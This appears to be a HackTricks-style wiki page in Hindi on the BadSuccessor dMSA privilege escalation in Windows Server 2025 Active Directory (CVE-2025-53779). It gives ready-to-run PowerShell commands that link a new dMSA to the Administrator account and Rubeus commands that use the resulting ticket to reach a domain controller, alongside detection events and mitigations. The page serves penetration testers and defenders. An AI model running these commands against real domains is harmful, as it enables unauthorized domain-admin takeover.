# BadSuccessor: Delegated MSA Migration Abuse के ज़रिए Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Overview

Delegated Managed Service Accounts (**dMSA**), Windows Server 2025 में उपलब्ध **gMSA** के next-generation successor हैं। एक वैध migration workflow में administrators, permissions को पारदर्शी रूप से बनाए रखते हुए किसी *पुराने* account (user, computer या service account) को dMSA से बदल सकते हैं। यह workflow `Start-ADServiceAccountMigration` और `Complete-ADServiceAccountMigration` जैसे PowerShell cmdlets के ज़रिए उपलब्ध है और **dMSA object** के दो LDAP attributes पर निर्भर करता है:

* **`msDS-ManagedAccountPrecededByLink`** – superseded (पुराने) account का *DN link*।
* **`msDS-DelegatedMSAState`**       – migration state (`0` = none, `1` = in-progress, `2` = *completed*)।<sup>[[1]](#references)</sup>

अगर कोई attacker किसी OU के अंदर **कोई भी** dMSA बना सकता है और इन 2 attributes में सीधे बदलाव कर सकता है, तो LSASS और KDC उस dMSA को linked account का *successor* मानेंगे। जब attacker बाद में dMSA के रूप में authenticate करता है, तो उसे **linked account के सभी privileges मिल जाते हैं** — Administrator account link होने पर **Domain Admin** तक के privileges।<sup>[[1]](#references)</sup>

Unit 42 ने 2025 में इस technique को **BadSuccessor** नाम दिया। बाद में Microsoft ने इसे **CVE-2025-53779** सौंपा और **August 2025** में security update जारी किया। यह technique unpatched Windows Server 2025 environments और खतरनाक OU delegation की समीक्षा के लिए प्रासंगिक बनी हुई है।<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Patched DCs पर भी, अगर attacker target account के migration attributes में लिख सकता है, तो [two-sided dMSA migration](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) उस account को उजागर कर सकती है। यह मूल arbitrary-target attack से अधिक सीमित है।

### Attack prerequisites

1. ऐसा account जिसे **an Organizational Unit (OU)** के अंदर objects बनाने की *अनुमति* हो *और* जिसके पास निम्न में से कम-से-कम एक अधिकार हो:
   * `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
   * `Create Child` → **`All Objects`** (generic create)
2. LDAP और Kerberos से network connectivity (standard domain joined scenario / remote attack)।<sup>[[1]](#references)</sup>

## Vulnerable OUs की Enumeration

Unit 42 ने एक PowerShell helper script जारी की है, जो हर OU के security descriptors को parse करती है और आवश्यक ACEs को highlight करती है:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

अंदरूनी तौर पर, script `(objectClass=organizationalUnit)` के लिए paged LDAP search चलाती है और हर `nTSecurityDescriptor` में ये जाँचती है:

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

एक writable OU की पहचान हो जाने के बाद, attack सिर्फ़ 3 LDAP writes में पूरा हो जाता है:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Replication के बाद attacker `attacker_dMSA$` के रूप में **logon** कर सकता है या Kerberos TGT का अनुरोध कर सकता है—Windows *superseded* account का token बनाएगा।<sup>[[1]](#references)</sup>

### स्वचालन

कई सार्वजनिक PoC में password retrieval और ticket management सहित पूरा workflow शामिल है:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Detection & Hunting

OUs पर **Object Auditing** सक्षम करें और इन Windows Security Events पर नज़र रखें:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** object बनना
* **5136** – **`msDS-ManagedAccountPrecededByLink`** में बदलाव
* **4662** – विशिष्ट attribute में बदलाव
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA के लिए TGT जारी होना

`4662` (attribute में बदलाव), `4741` (computer/service account बनना) और `4624` (इसके बाद logon) को correlate करने से BadSuccessor गतिविधि का तुरंत पता चलता है। **XSIAM** जैसे XDR solutions में इस्तेमाल के लिए तैयार queries उपलब्ध हैं (references देखें)।<sup>[[2]](#references)</sup>

## Mitigation

* **CVE-2025-53779** के लिए Microsoft का security update लागू करें और हर Windows Server 2025 domain controller का patch level सत्यापित करें।<sup>[[6]](#references)</sup>
* **least privilege** का सिद्धांत लागू करें – *Service Account* management केवल विश्वसनीय roles को delegate करें।
* उन OUs से `Create Child` / `msDS-DelegatedManagedServiceAccount` हटाएँ जिन्हें इनकी स्पष्ट रूप से आवश्यकता नहीं है।
* ऊपर सूचीबद्ध event IDs पर नज़र रखें और dMSA बनाने या edit करने वाली *non-Tier-0* identities पर alert करें।

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory में privileges बढ़ाने के लिए dMSA का दुरुपयोग – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – जब अच्छे accounts खराब हो जाते हैं: Delegated Managed Service Accounts का शोषण](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
